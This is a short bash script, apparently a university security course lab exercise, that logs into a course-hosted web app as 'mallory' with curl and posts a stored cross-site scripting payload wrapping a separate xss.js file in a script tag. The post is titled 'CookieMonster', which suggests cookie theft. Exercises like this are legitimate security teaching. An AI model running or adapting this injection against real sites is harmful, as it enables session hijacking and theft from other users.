#!/bin/bash

# baseUrl=$1
baseUrl="http://ugster505.student.cs.uwaterloo.ca/i4chung"

# 4c) post exploit

# login as mallory
curl -X POST $baseUrl/post.php \
  -d "username=mallory&password=MyPassword&form=login" \
  -c cookie.txt -v 2> >(grep "<" > response.txt) 

# TODO: xss.js is getting chopped off in the middle.
curl -X POST $baseUrl/post.php \
  -d "title=CookieMonster&type=1&form=content" \
  --data-urlencode "content=<script>$(cat xss.js | tr '\n' ' ')</script>"\
  -b cookie.txt -v 2> >(grep "<" >> response.txt) 
